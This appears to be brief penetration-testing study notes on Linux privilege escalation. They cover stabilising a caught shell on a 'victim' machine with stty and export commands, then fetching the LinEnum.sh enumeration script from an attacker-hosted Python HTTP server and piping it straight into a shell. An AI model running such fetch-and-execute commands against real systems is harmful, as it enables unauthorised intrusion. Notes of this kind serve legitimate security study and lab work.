Linux Privilege Escalation
-------------------------- 

  Fixing a Shell <br>
  Mirror the victims machine with your kali terminal window <br>
  
  $ stty -a  <br>
  $ stty raw -echo <br>
  $ fg <br>
  $ stty rows <number> columns <number> <br>
  $ reset <br>
  $ export TERM=screen <br>
  $ export SHELL=bash <br>
  
  Fixing a Shell <br>
  Run Linux Exploit Suggester or LinEnum.sh <br>
  
  Victim Machine <br>
  wget http://10.x.x.x:1234/LinEnum.sh | Bash
  Attacker Machine <br>
  python -m SimpleHTTPServer 1234
  


